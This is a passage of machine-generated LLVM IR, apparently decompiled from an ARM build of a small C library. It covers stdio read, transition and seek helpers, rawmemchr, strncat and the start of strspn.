  store i32 %v3_16220, i32* %stack_var_-8, align 4
  %v1_16224 = add i32 %arg1, 8
  %v1_16228 = inttoptr i32 %v1_16224 to i32*
  %v2_16228 = load i32, i32* %v1_16228, align 4
  store i32 %v2_16228, i32* @r1, align 4
  %v3_16228 = add i32 %arg1, 12
  %v4_16228 = inttoptr i32 %v3_16228 to i32*
  %v5_16228 = load i32, i32* %v4_16228, align 4
  %v2_1622c = sub i32 %v5_16228, %v2_16228
  store i32 %v2_1622c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_16234 = inttoptr i32 %arg1 to i8*
  %v4_16234 = call i32 @__stdio_READ(i8* %v3_16234, i32 %v2_16228, i32 %v2_1622c)
  %v0_16238 = load i32, i32* @r4, align 4
  %v1_16238 = add i32 %v0_16238, 8
  %v2_16238 = inttoptr i32 %v1_16238 to i32*
  %v3_16238 = load i32, i32* %v2_16238, align 4
  store i32 %v3_16238, i32* %r2.global-to-local, align 4
  %v2_1623c = add i32 %v3_16238, %v4_16234
  %v2_16240 = add i32 %v0_16238, 20
  %v3_16240 = inttoptr i32 %v2_16240 to i32*
  store i32 %v2_1623c, i32* %v3_16240, align 4
  %v0_16244 = load i32, i32* %r2.global-to-local, align 4
  %v1_16244 = load i32, i32* @r4, align 4
  %v2_16244 = add i32 %v1_16244, 16
  %v3_16244 = inttoptr i32 %v2_16244 to i32*
  store i32 %v0_16244, i32* %v3_16244, align 4
  %v2_16248 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16248, i32* @r4, align 4
  ret i32 %v4_16234

; uselistorder directives
  uselistorder i32 %v4_16234, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1624c = load i32, i32* @r4, align 4
  store i32 %v3_1624c, i32* %stack_var_-12, align 4
  %v0_16250 = load i32, i32* @r0, align 4
  %v1_16250 = inttoptr i32 %v0_16250 to i8*
  %v2_16250 = load i8, i8* %v1_16250, align 1
  %v3_16250 = zext i8 %v2_16250 to i32
  store i32 %v3_16250, i32* %r2.global-to-local, align 4
  %v1_16254 = add i32 %v0_16250, 1
  %v2_16254 = inttoptr i32 %v1_16254 to i8*
  %v3_16254 = load i8, i8* %v2_16254, align 1
  %v4_16254 = zext i8 %v3_16254 to i32
  store i32 %v4_16254, i32* %r3.global-to-local, align 4
  %v4_16258 = mul nuw nsw i32 %v4_16254, 256
  %v5_16258 = or i32 %v4_16258, %v3_16250
  store i32 %v5_16258, i32* %r2.global-to-local, align 4
  %v1_1625c = load i32, i32* @r1, align 4
  %v2_1625c = and i32 %v1_1625c, %v5_16258
  %v4_1625c = icmp eq i32 %v2_1625c, 0
  store i32 %v0_16250, i32* @r4, align 4
  br i1 %v4_1625c, label %dec_label_pc_16268, label %dec_label_pc_16280

dec_label_pc_16268:                               ; preds = %entry
  %v1_16268 = and i32 %v5_16258, 2176
  %v2_16268 = icmp eq i32 %v1_16268, 0
  br i1 %v2_16268, label %dec_label_pc_16270, label %dec_label_pc_16294

dec_label_pc_16270:                               ; preds = %dec_label_pc_16268
  %v2_16270 = or i32 %v1_1625c, %v5_16258
  store i32 %v2_16270, i32* %r2.global-to-local, align 4
  %v3_16274 = sdiv i32 %v2_16270, 256
  store i32 %v3_16274, i32* %r3.global-to-local, align 4
  %v1_16278 = trunc i32 %v3_16274 to i8
  store i8 %v1_16278, i8* %v2_16254, align 1
  %v0_1627c = load i32, i32* %r2.global-to-local, align 4
  %v1_1627c = trunc i32 %v0_1627c to i8
  %v2_1627c = load i32, i32* @r0, align 4
  %v3_1627c = inttoptr i32 %v2_1627c to i8*
  store i8 %v1_1627c, i8* %v3_1627c, align 1
  %v0_16280.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16280

dec_label_pc_16280:                               ; preds = %entry, %dec_label_pc_16270
  %v0_16280 = phi i32 [ %v0_16250, %entry ], [ %v0_16280.pre, %dec_label_pc_16270 ]
  %v1_16280 = inttoptr i32 %v0_16280 to i8*
  %v2_16280 = load i8, i8* %v1_16280, align 1
  %v3_16280 = zext i8 %v2_16280 to i32
  store i32 %v3_16280, i32* %r2.global-to-local, align 4
  %v1_16284 = add i32 %v0_16280, 1
  %v2_16284 = inttoptr i32 %v1_16284 to i8*
  %v3_16284 = load i8, i8* %v2_16284, align 1
  %v4_16284 = zext i8 %v3_16284 to i32
  %v4_16288 = mul nuw nsw i32 %v4_16284, 256
  %v5_16288 = or i32 %v4_16288, %v3_16280
  store i32 %v5_16288, i32* %r3.global-to-local, align 4
  %v1_1628c = and i32 %v3_16280, 16
  store i32 %v1_1628c, i32* %r5.global-to-local, align 4
  %v2_1628c = icmp eq i32 %v1_1628c, 0
  br i1 %v2_1628c, label %dec_label_pc_162bc, label %dec_label_pc_16294

dec_label_pc_16294:                               ; preds = %dec_label_pc_16268, %dec_label_pc_16280
  %v0_16294 = call i32 @__errno_location()
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1629c = inttoptr i32 %v0_16294 to i32*
  store i32 9, i32* %v2_1629c, align 4
  br label %dec_label_pc_162a0

dec_label_pc_162a0:                               ; preds = %dec_label_pc_162c4, %dec_label_pc_16294
  %v0_162a0 = load i32, i32* @r4, align 4
  %v1_162a0 = inttoptr i32 %v0_162a0 to i32*
  %v2_162a0 = load i32, i32* %v1_162a0, align 4
  %v1_162a4 = or i32 %v2_162a0, 8
  store i32 %v1_162a4, i32* %r3.global-to-local, align 4
  %v3_162a8 = sdiv i32 %v2_162a0, 256
  store i32 %v3_162a8, i32* %r2.global-to-local, align 4
  %v1_162b0 = trunc i32 %v3_162a8 to i8
  %v3_162b0 = add i32 %v0_162a0, 1
  %v4_162b0 = inttoptr i32 %v3_162b0 to i8*
  store i8 %v1_162b0, i8* %v4_162b0, align 1
  %v0_162b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_162b4 = trunc i32 %v0_162b4 to i8
  %v2_162b4 = load i32, i32* @r4, align 4
  %v3_162b4 = inttoptr i32 %v2_162b4 to i8*
  store i8 %v1_162b4, i8* %v3_162b4, align 1
  %v2_162b8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_162b8, i32* @r4, align 4
  ret i32 -1

dec_label_pc_162bc:                               ; preds = %dec_label_pc_16280
  %v1_162bc = and i32 %v3_16280, 64
  %v2_162bc = icmp eq i32 %v1_162bc, 0
  br i1 %v2_162bc, label %dec_label_pc_162ec, label %dec_label_pc_162c4

dec_label_pc_162c4:                               ; preds = %dec_label_pc_162bc
  %v0_162c4 = call i32 @__stdio_wcommit()
  %v2_162c8 = icmp eq i32 %v0_162c4, 0
  br i1 %v2_162c8, label %dec_label_pc_162d0, label %dec_label_pc_162a0

dec_label_pc_162d0:                               ; preds = %dec_label_pc_162c4
  %v0_162d0 = load i32, i32* @r4, align 4
  %v1_162d0 = inttoptr i32 %v0_162d0 to i32*
  %v2_162d0 = load i32, i32* %v1_162d0, align 4
  store i32 %v2_162d0, i32* %r3.global-to-local, align 4
  %v1_162d4 = add i32 %v0_162d0, 8
  %v2_162d4 = inttoptr i32 %v1_162d4 to i32*
  %v3_162d4 = load i32, i32* %v2_162d4, align 4
  store i32 %v3_162d4, i32* %r2.global-to-local, align 4
  %v1_162d8 = and i32 %v2_162d0, -65
  store i32 %v1_162d8, i32* %r3.global-to-local, align 4
  %v3_162dc = sdiv i32 %v2_162d0, 256
  store i32 %v3_162dc, i32* %r1.global-to-local, align 4
  %v2_162e0 = add i32 %v0_162d0, 28
  %v3_162e0 = inttoptr i32 %v2_162e0 to i32*
  store i32 %v3_162d4, i32* %v3_162e0, align 4
  %v0_162e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_162e4 = trunc i32 %v0_162e4 to i8
  %v2_162e4 = load i32, i32* @r4, align 4
  %v3_162e4 = add i32 %v2_162e4, 1
  %v4_162e4 = inttoptr i32 %v3_162e4 to i8*
  store i8 %v1_162e4, i8* %v4_162e4, align 1
  %v0_162e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_162e8 = trunc i32 %v0_162e8 to i8
  %v2_162e8 = load i32, i32* @r4, align 4
  %v3_162e8 = inttoptr i32 %v2_162e8 to i8*
  store i8 %v1_162e8, i8* %v3_162e8, align 1
  %v0_162ec.pre = load i32, i32* @r4, align 4
  %v0_162f8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_162ec

dec_label_pc_162ec:                               ; preds = %dec_label_pc_162bc, %dec_label_pc_162d0
  %v0_162f8 = phi i32 [ 0, %dec_label_pc_162bc ], [ %v0_162f8.pre, %dec_label_pc_162d0 ]
  %v2_162fc = phi i32 [ %v0_16280, %dec_label_pc_162bc ], [ %v0_162ec.pre, %dec_label_pc_162d0 ]
  %v1_162ec = inttoptr i32 %v2_162fc to i32*
  %v2_162ec = load i32, i32* %v1_162ec, align 4
  %v1_162f0 = or i32 %v2_162ec, 1
  store i32 %v1_162f0, i32* %r3.global-to-local, align 4
  %v3_162f4 = sdiv i32 %v2_162ec, 256
  store i32 %v3_162f4, i32* %r2.global-to-local, align 4
  %v1_162fc = trunc i32 %v3_162f4 to i8
  %v3_162fc = add i32 %v2_162fc, 1
  %v4_162fc = inttoptr i32 %v3_162fc to i8*
  store i8 %v1_162fc, i8* %v4_162fc, align 1
  %v0_16300 = load i32, i32* %r3.global-to-local, align 4
  %v1_16300 = trunc i32 %v0_16300 to i8
  %v2_16300 = load i32, i32* @r4, align 4
  %v3_16300 = inttoptr i32 %v2_16300 to i8*
  store i8 %v1_16300, i8* %v3_16300, align 1
  %v2_16304 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16304, i32* @r4, align 4
  ret i32 %v0_162f8

; uselistorder directives
  uselistorder i32 %v3_162f4, { 1, 0 }
  uselistorder i32 %v3_162a8, { 1, 0 }
  uselistorder i32 %v3_16280, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16280, { 0, 2, 1 }
  uselistorder i32 %v3_16274, { 1, 0 }
  uselistorder i32 %v5_16258, { 0, 2, 1, 3 }
  uselistorder i32 ()* @__stdio_wcommit, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder label %dec_label_pc_162ec, { 1, 0 }
  uselistorder label %dec_label_pc_16294, { 1, 0 }
  uselistorder label %dec_label_pc_16280, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %v3_1630c = load i32, i32* @r4, align 4
  %v6_1630c = load i32, i32* @lr, align 4
  %v1_16310 = add i32 %arg1, 4
  %v2_16310 = inttoptr i32 %v1_16310 to i32*
  %v3_16310 = load i32, i32* %v2_16310, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_16318 = load i32, i32* %arg2, align 4
  %v3_16318 = add i32 %tmp, 4
  %v4_16318 = inttoptr i32 %v3_16318 to i32*
  %v5_16318 = load i32, i32* %v4_16318, align 4
  %v6_1631c = call i32 @__libc_lseek64(i32 %v3_16310, i32 %v2_16318, i32 %v5_16318, i32 %arg3, i32 %v3_1630c, i32 %v6_1630c)
  %v1_16320 = icmp slt i32 %v2_16318, 0
  %v6_1631c. = select i1 %v1_16320, i32 %v6_1631c, i32 0
  store i32 %v6_1631c., i32* %r3.global-to-local, align 4
  br i1 %v1_16320, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v3_1632c = load i32, i32* @r4, align 4
  %v4_1632c = inttoptr i32 %v3_1632c to i32*
  store i32 %v6_1631c, i32* %v4_1632c, align 4
  %v6_1632c = add i32 %v3_1632c, 4
  %v7_1632c = inttoptr i32 %v6_1632c to i32*
  store i32 %v2_16318, i32* %v7_1632c, align 4
  %v0_16330.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v0_16330 = phi i32 [ %v6_1631c, %entry ], [ %v0_16330.pre, %bb ]
  ret i32 %v0_16330

; uselistorder directives
  uselistorder i32 %v6_1631c, { 0, 2, 1 }
  uselistorder i32 %v2_16318, { 1, 2, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1635c:
  %v1_1633c = urem i32 %arg1, 256
  store i32 %v1_1633c, i32* @lr, align 4
  %v4_1635c = mul nuw nsw i32 %v1_1633c, 256
  %v5_1635c = or i32 %v4_1635c, %v1_1633c
  %v4_16364 = mul i32 %v5_1635c, 65536
  %v5_16364 = or i32 %v4_16364, %v5_1635c
  %v0_16368.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_16368

dec_label_pc_16368:                               ; preds = %dec_label_pc_163d4, %dec_label_pc_16368, %dec_label_pc_1635c
  %v0_16368 = phi i32 [ %v0_16368.pre, %dec_label_pc_1635c ], [ %v4_16368, %dec_label_pc_16368 ], [ %v4_16368, %dec_label_pc_163d4 ]
  %v1_16368 = inttoptr i32 %v0_16368 to i32*
  %v2_16368 = load i32, i32* %v1_16368, align 4
  %v4_16368 = add i32 %v0_16368, 4
  store i32 %v4_16368, i32* @ip, align 4
  %v2_16370 = xor i32 %v2_16368, %v5_16364
  %v2_16374 = add i32 %v2_16370, 2130640639
  %v1_1637c = sub i32 -1, %v2_16370
  %v2_16380 = xor i32 %v2_16374, %v1_1637c
  %v2_16384 = and i32 %v2_16380, -2130640640
  %v2_16388 = icmp eq i32 %v2_16384, 0
  br i1 %v2_16388, label %dec_label_pc_16368, label %dec_label_pc_16390

dec_label_pc_16390:                               ; preds = %dec_label_pc_16368
  %v2_16390 = inttoptr i32 %v0_16368 to i8*
  %v3_16390 = load i8, i8* %v2_16390, align 1
  %v4_16390 = zext i8 %v3_16390 to i32
  %v9_16398 = icmp eq i32 %v4_16390, %v1_1633c
  store i1 %v9_16398, i1* @cpsr_z, align 1
  %v1_1639c = add i32 %v0_16368, 3
  %v1_163a0 = add i32 %v0_16368, 1
  store i32 %v1_163a0, i32* @r2, align 4
  %v1_163a4 = add i32 %v0_16368, 2
  br i1 %v9_16398, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_16390
  ret i32 %v0_16368

bb18:                                             ; preds = %dec_label_pc_16390
  %v2_163ac = inttoptr i32 %v1_163a0 to i8*
  %v3_163ac = load i8, i8* %v2_163ac, align 1
  %v4_163ac = zext i8 %v3_163ac to i32
  %v9_163b0 = icmp eq i32 %v4_163ac, %v1_1633c
  store i1 %v9_163b0, i1* @cpsr_z, align 1
  br i1 %v9_163b0, label %dec_label_pc_163b8, label %dec_label_pc_163c0

dec_label_pc_163b8:                               ; preds = %bb18
  ret i32 %v1_163a0

dec_label_pc_163c0:                               ; preds = %bb18
  %v2_163c0 = inttoptr i32 %v1_163a4 to i8*
  %v3_163c0 = load i8, i8* %v2_163c0, align 1
  %v4_163c0 = zext i8 %v3_163c0 to i32
  %v9_163c4 = icmp eq i32 %v4_163c0, %v1_1633c
  store i1 %v9_163c4, i1* @cpsr_z, align 1
  br i1 %v9_163c4, label %dec_label_pc_163cc, label %dec_label_pc_163d4

dec_label_pc_163cc:                               ; preds = %dec_label_pc_163c0
  ret i32 %v1_163a4

dec_label_pc_163d4:                               ; preds = %dec_label_pc_163c0
  %v2_163d4 = inttoptr i32 %v1_1639c to i8*
  %v3_163d4 = load i8, i8* %v2_163d4, align 1
  %v4_163d4 = zext i8 %v3_163d4 to i32
  %v9_163d8 = icmp eq i32 %v4_163d4, %v1_1633c
  store i1 %v9_163d8, i1* @cpsr_z, align 1
  br i1 %v9_163d8, label %dec_label_pc_163e0, label %dec_label_pc_16368

dec_label_pc_163e0:                               ; preds = %dec_label_pc_163d4
  ret i32 %v1_1639c

; uselistorder directives
  uselistorder i32 %v4_16368, { 2, 1, 0 }
  uselistorder i32 %v0_16368, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1635c, { 1, 0 }
  uselistorder i32 %v1_1633c, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 6, 7, 2, 0, 8, 3, 1, 4, 5 }
  uselistorder i32 2130640639, { 4, 0, 1, 2, 3 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_163f0 = load i32, i32* @r4, align 4
  store i32 %v3_163f0, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_163fc

dec_label_pc_163fc:                               ; preds = %dec_label_pc_163fc, %entry
  %v0_163fc = phi i32 [ %v5_163fc, %dec_label_pc_163fc ], [ %tmp, %entry ]
  %v1_163fc = inttoptr i32 %v0_163fc to i8*
  %v2_163fc = load i8, i8* %v1_163fc, align 1
  %v3_163fc = zext i8 %v2_163fc to i32
  store i32 %v3_163fc, i32* %ip.global-to-local, align 4
  %v5_163fc = add i32 %v0_163fc, 1
  store i32 %v5_163fc, i32* %r3.global-to-local, align 4
  %v2_16400 = icmp eq i8 %v2_163fc, 0
  store i1 %v2_16400, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16400, label %dec_label_pc_16408, label %dec_label_pc_163fc

dec_label_pc_16408:                               ; preds = %dec_label_pc_163fc
  %v0_16408 = load i32, i32* %r2.global-to-local, align 4
  %v7_16408 = icmp eq i32 %v0_16408, 3
  store i1 %v7_16408, i1* %cpsr_z.global-to-local, align 1
  %v1_1640c = add i32 %v0_163fc, -1
  store i32 %v1_1640c, i32* %lr.global-to-local, align 4
  %tmp10 = icmp ult i32 %v0_16408, 4
  br i1 %tmp10, label %dec_label_pc_164a0thread-pre-split, label %dec_label_pc_16414

dec_label_pc_16414:                               ; preds = %dec_label_pc_16408
  %v3_16414 = udiv i32 %v0_16408, 4
  store i32 %v3_16414, i32* %r0.global-to-local, align 4
  %v0_16418.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_16418

dec_label_pc_16418:                               ; preds = %dec_label_pc_16478, %dec_label_pc_16414
  %v2_16420 = phi i32 [ %v1_16470, %dec_label_pc_16478 ], [ %v1_1640c, %dec_label_pc_16414 ]
  %v0_16418 = phi i32 [ %v1_1646c, %dec_label_pc_16478 ], [ %v0_16418.pre, %dec_label_pc_16414 ]
  %v1_16418 = inttoptr i32 %v0_16418 to i8*
  %v2_16418 = load i8, i8* %v1_16418, align 1
  %v3_16418 = zext i8 %v2_16418 to i32
  store i32 %v3_16418, i32* %r3.global-to-local, align 4
  %v2_1641c = icmp eq i8 %v2_16418, 0
  store i1 %v2_1641c, i1* %cpsr_z.global-to-local, align 1
  %v3_16420 = add i32 %v2_16420, 1
  %v4_16420 = inttoptr i32 %v3_16420 to i8*
  store i8 %v2_16418, i8* %v4_16420, align 1
  %v0_16424 = load i32, i32* %lr.global-to-local, align 4
  %v1_16424 = add i32 %v0_16424, 1
  store i32 %v1_16424, i32* %ip.global-to-local, align 4
  %v0_16428 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16428, label %.loopexit, label %dec_label_pc_1642c

dec_label_pc_1642c:                               ; preds = %dec_label_pc_16418
  %v0_1642c = load i32, i32* @r1, align 4
  %v1_1642c = add i32 %v0_1642c, 1
  %v2_1642c = inttoptr i32 %v1_1642c to i8*
  %v3_1642c = load i8, i8* %v2_1642c, align 1
  %v4_1642c = zext i8 %v3_1642c to i32
  store i32 %v4_1642c, i32* %r3.global-to-local, align 4
  %v2_16430 = icmp eq i8 %v3_1642c, 0
  store i1 %v2_16430, i1* %cpsr_z.global-to-local, align 1
  %v3_16434 = add i32 %v0_16424, 2
  %v4_16434 = inttoptr i32 %v3_16434 to i8*
  store i8 %v3_1642c, i8* %v4_16434, align 1
  %v0_16438 = load i32, i32* @r1, align 4
  %v1_16438 = add i32 %v0_16438, 1
  store i32 %v1_16438, i32* %r1.global-to-local, align 4
  %v0_1643c = load i32, i32* %ip.global-to-local, align 4
  %v1_1643c = add i32 %v0_1643c, 1
  store i32 %v1_1643c, i32* %ip.global-to-local, align 4
  %v0_16440 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16440, label %.loopexit, label %dec_label_pc_16444

dec_label_pc_16444:                               ; preds = %dec_label_pc_1642c
  %v1_16444 = add i32 %v0_16438, 2
  %v2_16444 = inttoptr i32 %v1_16444 to i8*
  %v3_16444 = load i8, i8* %v2_16444, align 1
  %v4_16444 = zext i8 %v3_16444 to i32
  store i32 %v4_16444, i32* %r3.global-to-local, align 4
  %v2_16448 = icmp eq i8 %v3_16444, 0
  store i1 %v2_16448, i1* %cpsr_z.global-to-local, align 1
  %v3_1644c = add i32 %v0_1643c, 2
  %v4_1644c = inttoptr i32 %v3_1644c to i8*
  store i8 %v3_16444, i8* %v4_1644c, align 1
  %v0_16450 = load i32, i32* %r1.global-to-local, align 4
  %v1_16450 = add i32 %v0_16450, 1
  store i32 %v1_16450, i32* %r1.global-to-local, align 4
  %v0_16454 = load i32, i32* %ip.global-to-local, align 4
  %v1_16454 = add i32 %v0_16454, 1
  store i32 %v1_16454, i32* %lr.global-to-local, align 4
  %v0_16458 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16458, label %.loopexit, label %dec_label_pc_1645c

dec_label_pc_1645c:                               ; preds = %dec_label_pc_16444
  %v1_1645c = add i32 %v0_16450, 2
  %v2_1645c = inttoptr i32 %v1_1645c to i8*
  %v3_1645c = load i8, i8* %v2_1645c, align 1
  %v4_1645c = zext i8 %v3_1645c to i32
  store i32 %v4_1645c, i32* %ip.global-to-local, align 4
  store i32 %v1_1645c, i32* %r3.global-to-local, align 4
  %v2_16464 = icmp eq i8 %v3_1645c, 0
  store i1 %v2_16464, i1* %cpsr_z.global-to-local, align 1
  %v3_16468 = add i32 %v0_16454, 2
  %v4_16468 = inttoptr i32 %v3_16468 to i8*
  store i8 %v3_1645c, i8* %v4_16468, align 1
  %v0_1646c = load i32, i32* %r3.global-to-local, align 4
  %v1_1646c = add i32 %v0_1646c, 1
  store i32 %v1_1646c, i32* @r1, align 4
  %v0_16470 = load i32, i32* %lr.global-to-local, align 4
  %v1_16470 = add i32 %v0_16470, 1
  store i32 %v1_16470, i32* %lr.global-to-local, align 4
  %v0_16474 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16474, label %.loopexit, label %dec_label_pc_16478

dec_label_pc_16478:                               ; preds = %dec_label_pc_1645c
  %v0_16478 = load i32, i32* %r0.global-to-local, align 4
  %v1_16478 = add i32 %v0_16478, -1
  store i32 %v1_16478, i32* %r0.global-to-local, align 4
  %v7_16478 = icmp eq i32 %v0_16478, 1
  store i1 %v7_16478, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16478, label %dec_label_pc_16480, label %dec_label_pc_16418

dec_label_pc_16480:                               ; preds = %dec_label_pc_16478
  %v0_16480 = load i32, i32* %r2.global-to-local, align 4
  %v1_16480 = urem i32 %v0_16480, 4
  store i32 %v1_16480, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_164a0

dec_label_pc_16488:                               ; preds = %dec_label_pc_164a0
  %v0_16488 = load i32, i32* @r1, align 4
  %v1_16488 = inttoptr i32 %v0_16488 to i8*
  %v2_16488 = load i8, i8* %v1_16488, align 1
  %v3_16488 = zext i8 %v2_16488 to i32
  store i32 %v3_16488, i32* %ip.global-to-local, align 4
  %v2_1648c = icmp eq i8 %v2_16488, 0
  store i1 %v2_1648c, i1* %cpsr_z.global-to-local, align 1
  %v1_16490 = add i32 %v1_164ac, -1
  store i32 %v1_16490, i32* %r2.global-to-local, align 4
  %v3_16494 = add i32 %v3_164ac, 1
  %v4_16494 = inttoptr i32 %v3_16494 to i8*
  store i8 %v2_16488, i8* %v4_16494, align 1
  %v5_16494 = load i32, i32* %lr.global-to-local, align 4
  %v6_16494 = add i32 %v5_16494, 1
  store i32 %v6_16494, i32* %lr.global-to-local, align 4
  %v0_16498 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16498, label %.loopexit, label %dec_label_pc_1649c

dec_label_pc_1649c:                               ; preds = %dec_label_pc_16488
  %v0_1649c = load i32, i32* @r1, align 4
  %v1_1649c = add i32 %v0_1649c, 1
  store i32 %v1_1649c, i32* @r1, align 4
  %v0_164a0.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_164a0thread-pre-split

dec_label_pc_164a0thread-pre-split:               ; preds = %dec_label_pc_1649c, %dec_label_pc_16408
  %v2_164946 = phi i32 [ %v6_16494, %dec_label_pc_1649c ], [ %v1_1640c, %dec_label_pc_16408 ]
  %v0_164a0.pr = phi i32 [ %v0_164a0.pr.pre, %dec_label_pc_1649c ], [ %v0_16408, %dec_label_pc_16408 ]
  br label %dec_label_pc_164a0

dec_label_pc_164a0:                               ; preds = %dec_label_pc_164a0thread-pre-split, %dec_label_pc_16480
  %v3_164ac = phi i32 [ %v2_164946, %dec_label_pc_164a0thread-pre-split ], [ %v1_16470, %dec_label_pc_16480 ]
  %v1_164ac = phi i32 [ %v0_164a0.pr, %dec_label_pc_164a0thread-pre-split ], [ %v1_16480, %dec_label_pc_16480 ]
  %v2_164a0 = icmp eq i32 %v1_164ac, 0
  store i1 %v2_164a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_164a0, label %dec_label_pc_164a8, label %dec_label_pc_16488

dec_label_pc_164a8:                               ; preds = %dec_label_pc_164a0
  %v0_164a8 = load i32, i32* %ip.global-to-local, align 4
  %v2_164a8 = icmp eq i32 %v0_164a8, 0
  store i1 %v2_164a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_164a8, label %.loopexit, label %bb

bb:                                               ; preds = %dec_label_pc_164a8
  %v4_164ac = add i32 %v3_164ac, 1
  %v5_164ac = inttoptr i32 %v4_164ac to i8*
  store i8 0, i8* %v5_164ac, align 1
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_1645c, %dec_label_pc_16444, %dec_label_pc_1642c, %dec_label_pc_16418, %dec_label_pc_16488, %dec_label_pc_164a8, %bb
  %v0_164b0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_164b0, i32* %r0.global-to-local, align 4
  %v2_164b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_164b4, i32* @r4, align 4
  ret i32 %v0_164b0

; uselistorder directives
  uselistorder i32 %v1_164ac, { 1, 0 }
  uselistorder i32 %v1_16480, { 1, 0 }
  uselistorder i32 %v0_16478, { 1, 0 }
  uselistorder i32 %v1_16470, { 0, 2, 1 }
  uselistorder i32 %v1_1646c, { 1, 0 }
  uselistorder i32 %v0_16408, { 2, 1, 0, 3 }
  uselistorder i32 %v5_163fc, { 1, 0 }
  uselistorder i32 %v0_163fc, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %.loopexit, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_164f02 = load i32, i32* @r0, align 4
  %v1_164f03 = inttoptr i32 %v0_164f02 to i8*
  %v2_164f04 = load i8, i8* %v1_164f03, align 1
  %v3_164f05 = zext i8 %v2_164f04 to i32
  store i32 %v3_164f05, i32* @r2, align 4
  %v2_164f46 = icmp eq i8 %v2_164f04, 0
  br i1 %v2_164f46, label %dec_label_pc_16500, label %dec_label_pc_164cc.preheader

dec_label_pc_164c4:                               ; preds = %dec_label_pc_164cc
  %v1_164d4 = add i32 %v0_164d4, 1
  %v9_164c4 = icmp eq i32 %v0_164e0, %v3_164cc
  br i1 %v9_164c4, label %dec_label_pc_164e0, label %dec_label_pc_164cc

dec_label_pc_164cc:                               ; preds = %dec_label_pc_164cc.preheader, %dec_label_pc_164c4
  %v0_164d4 = phi i32 [ %tmp, %dec_label_pc_164cc.preheader ], [ %v1_164d4, %dec_label_pc_164c4 ]
  %v1_164cc = inttoptr i32 %v0_164d4 to i8*
  %v2_164cc = load i8, i8* %v1_164cc, align 1
  %v3_164cc = zext i8 %v2_164cc to i32
  store i32 %v3_164cc, i32* @ip, align 4
  %v2_164d0 = icmp eq i8 %v2_164cc, 0
  br i1 %v2_164d0, label %dec_label_pc_16500, label %dec_label_pc_164c4

